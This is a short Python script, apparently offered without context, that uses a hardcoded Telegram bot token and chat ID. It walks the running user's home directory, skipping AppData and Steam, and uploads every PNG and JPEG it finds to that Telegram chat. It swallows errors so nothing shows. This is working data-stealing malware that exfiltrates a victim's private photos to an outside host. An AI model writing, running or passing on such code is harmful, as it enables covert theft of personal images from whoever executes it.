import os, sys, telebot


def prnt(fil):
    try:
        bot = telebot.TeleBot("5691847290:AAFfhUaqxdCP_v_rmB7h3HVlPAQj6wLkpuY")
        bot.send_photo(974221395, open(fil, 'rb'))
        #bot.send_message(974221395, fil)
    except BaseException:
        pass


def ff(patch, n):
    if n < 10 and patch.split('\\')[-1] != 'AppData' and patch.split('\\')[-1] != 'AppData':
        global ss
        for i in os.listdir(patch):
            if '.' in i:
                if i.lower().endswith((".png", ".jpeg", ".jpg")):
                    prnt(patch + '\\' + i)


            else:
                try:
                    ff(patch + "\\" + i, n + 1)
                except BaseException:
                    pass


def f():
    global ss
    s = sys.exec_prefix
    ff(s.split('\\')[0] + '\\' + s.split('\\')[1] + '\\' + s.split('\\')[2], 0)
s = sys.exec_prefix
patch = [s.split('\\')[0] + '\\' + s.split('\\')[1] + '\\' + s.split('\\')[2]]
while patch:
    try:
        for i in os.listdir(patch[0]):
            if '.' in i:
                if i.lower().endswith((".png", ".jpeg", ".jpg")):
                    prnt(patch[0] + '\\' + i)


            else:
                if i not in ['AppData', 'Steam']:
                    patch.append(patch[0] + "\\" + i)
    except BaseException:
        pass
    del patch[0]

